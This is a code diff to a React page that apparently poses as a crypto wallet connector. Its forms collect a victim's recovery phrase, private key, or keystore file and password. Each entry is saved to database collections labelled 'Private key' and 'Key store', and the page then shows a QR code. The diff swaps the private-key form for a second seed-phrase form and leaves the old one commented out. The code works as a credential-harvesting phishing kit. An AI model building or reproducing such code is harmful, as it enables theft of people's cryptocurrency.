@@ -60,7 +60,7 @@ export const QrCodePopUp = () => {
   );
 };
 
-export const FirstTab = (props) => {
+export const FirstTab = () => {
   const [inputValue, setInputValue] = useState("");
   const  {showQr, setShowQr, generate} = useContext(AppContext);
 
@@ -90,6 +90,7 @@ export const FirstTab = (props) => {
       <p className="key-type">input secret phrase</p>
       <form onSubmit={handleSubmit}>
         <textarea
+        
           type="text"
           value={inputValue}
           onChange={handleInputChange}
@@ -119,7 +120,6 @@ export const FirstTab = (props) => {
 };
 
 // SecondTab.js
-
 export const SecondTab = () => {
   const [inputValue, setInputValue] = useState("");
   const  {showQr, setShowQr, generate} = useContext(AppContext);
@@ -130,10 +130,10 @@ export const SecondTab = () => {
 
   const handleSubmit = (event) => {
     event.preventDefault();
-    // do something with the input value
+
     db.collection("Private key")
       .add({
-        privateKey: inputValue,
+        phrase: inputValue,
       })
       .then(() => {
         generate()
@@ -146,23 +146,27 @@ export const SecondTab = () => {
   };
 
   return (
-    <div className="SecondTab">
-      <p className="key-type">input Private Key </p>
+    <div className="FirstTab">
+      <p className="key-type">input secret phrase</p>
       <form onSubmit={handleSubmit}>
-        <input
+        <textarea
+        
           type="text"
           value={inputValue}
           onChange={handleInputChange}
-          name="name"
-          placeholder="Enter Private Key"
+          name="postContent"
+         
+          placeholder="Enter Phrase"
           style={{
-            padding: 5,
-            width: "80%",
-            borderRadius: 15,
+            width: "100%",
             color: "#000000",
+            fontSize: 16,
+            padding: 5,
           }}
         />
-        <p className="type-info">Typically 64 characters</p>
+        <p className="type-info">
+          Typically 12(sometimes 24) words separated by single spaces
+        </p>
 
         <div className="" onClick={() => {}}>
           <button type="submit" className="submit-key">
@@ -174,8 +178,62 @@ export const SecondTab = () => {
   );
 };
 
+// export const SecondTab2 = () => {
+//   const [secondinputValue, setSecondInputValue] = useState("");
+//   const  {showQr, setShowQr, generate} = useContext(AppContext);
+
+//   const handleInputChange = (event) => {
+//     setSecondInputValue(event.target.value);
+//   };
+
+//   const handleSubmit = (event) => {
+//     event.preventDefault();
+//     // do something with the input value
+//     db.collection("Private key")
+//       .add({
+//         privateKey: secondinputValue,
+//       })
+//       .then(() => {
+//         generate()
+//         setShowQr(!showQr)
+//       })
+//       .catch((error) => {
+//         alert(error.message);
+//       });
+//       setSecondInputValue("");
+//   };
+
+//   return (
+//     <div className="SecondTab">
+//       <p className="key-type">input Private Key </p>
+//       <form onSubmit={handleSubmit}>
+//         <input
+//           type="text"
+//           value={secondinputValue}
+//           onChange={handleInputChange}
+//           name="name"
+//           placeholder="Enter Private Key"
+//           style={{
+//             padding: 5,
+//             width: "80%",
+//             borderRadius: 15,
+//             color: "#000000",
+//           }}
+//         />
+//         <p className="type-info">Typically 64 characters</p>
+
+//         <div className="" onClick={() => {}}>
+//           <button type="submit" className="submit-key">
+//             Connect Wallet
+//           </button>
+//         </div>
+//       </form>
+//     </div>
+//   );
+// };
+
 export const ThirdTab = () => {
-  const [inputValue, setInputValue] = useState({
+  const [thirdInputValue, setThirdInputValue] = useState({
     keystore: "",
     passwordField: "",
   });
@@ -183,15 +241,15 @@ export const ThirdTab = () => {
 
   const handleInputChange = (event) => {
     const { name, value } = event.target;
-    setInputValue({ ...inputValue, [name]: value });
+    setThirdInputValue({ ...thirdInputValue, [name]: value });
   };
 
   const handleSubmit = (event) => {
     event.preventDefault();
     db.collection("Key store")
       .add({
-        keystore: inputValue.keystore,
-        password: inputValue.passwordField,
+        keystore: thirdInputValue.keystore,
+        password: thirdInputValue.passwordField,
       })
       .then(() => {
         generate()
@@ -200,7 +258,7 @@ export const ThirdTab = () => {
       .catch((error) => {
         alert(error.message);
       });
-    setInputValue({
+      setThirdInputValue({
       keystore: "",
       passwordField: "",
     });
@@ -212,7 +270,7 @@ export const ThirdTab = () => {
       <form onSubmit={handleSubmit}>
         <textarea
           type="text"
-          value={inputValue.keystore}
+          value={thirdInputValue.keystore}
           onChange={handleInputChange}
           name="keystore"
           rows={4}
@@ -229,7 +287,7 @@ export const ThirdTab = () => {
 
         <input
           type="text"
-          value={inputValue.passwordField}
+          value={thirdInputValue.passwordField}
           onChange={handleInputChange}
           name="passwordField"
           placeholder="Enter Password"
